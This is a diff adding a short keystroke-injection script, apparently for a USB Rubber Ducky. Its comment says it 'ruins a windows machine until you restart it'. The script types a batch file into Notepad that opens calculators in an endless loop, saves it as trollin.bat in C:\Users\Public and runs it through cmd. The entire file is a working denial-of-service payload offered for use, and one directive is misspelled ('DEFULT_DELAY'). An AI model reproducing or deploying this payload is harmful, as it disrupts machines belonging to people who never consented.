@@ -1,0 +1,33 @@
+REM Generates a script that spawns infinite calculators and ruins a windows machine until you restart it.
+DEFULT_DELAY 250
+GUI
+STRING notepad
+ENTER
+CTRL n
+STRING @echo off
+DELAY 20
+ENTER
+DELAY 20
+STRING :start
+DELAY 20
+ENTER
+DELAY 20
+STRING start calc.exe
+DELAY 20
+ENTER
+DELAY 20
+STRING goto start
+DELAY 20
+CTRL s
+STRING trollin.bat
+ALT d
+STRING C:\Users\Public
+ENTER
+ENTER
+GUI
+STRING cmd
+ENTER
+STRING cd C:\Users\Public
+ENTER
+STRING trollin.bat
+ENTER
